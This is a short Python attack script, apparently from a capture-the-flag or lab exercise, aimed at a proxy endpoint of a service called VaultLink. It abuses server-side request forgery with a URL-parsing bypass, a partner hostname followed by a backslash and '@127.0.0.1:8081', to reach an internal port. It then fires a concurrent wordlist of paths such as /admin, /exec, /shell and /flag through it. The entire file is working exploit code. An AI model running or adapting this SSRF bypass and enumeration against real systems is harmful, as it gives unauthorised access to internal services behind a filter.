import requests, concurrent.futures as cf
P="http://127.0.0.1:24606/api/proxy"
INNER="http://rates.partner-forex.example.com\\@127.0.0.1:8081"
words=["","/ws","/feed","/feeds","/stream","/streams","/subscribe","/pub","/pubsub","/admin","/ops",
"/console","/status","/health","/healthz","/metrics","/debug","/echo","/headers","/whoami","/info",
"/version","/config","/internal","/internal/status","/api","/api/feeds","/api/subscribe","/api/status",
"/api/admin","/v1","/v2","/relay","/core","/ledger","/summary","/rates","/settlement","/push","/ws/",
"/ws/admin","/ws/ops","/ws/status","/admin/ws","/socket","/socket.io","/events","/event","/connect",
"/session","/sessions","/auth","/login","/token","/key","/flag","/read","/file","/files","/exec",
"/run","/shell","/cmd","/console/ws","/metrics/ws"]
def probe(w):
    try:
        r=requests.get(P, params={"url":INNER+w}, timeout=5)
        body=r.text.strip()
        if body!="VaultLink relay - partner feed endpoint: /ws (upgrade required)" or r.status_code!=200:
            return (w, r.status_code, body[:120].replace("\n"," "))
    except Exception as e:
        return (w,"EXC",str(e)[:60])
with cf.ThreadPoolExecutor(max_workers=12) as ex:
    for o in ex.map(probe, words):
        if o: print(o)
print("scan done")
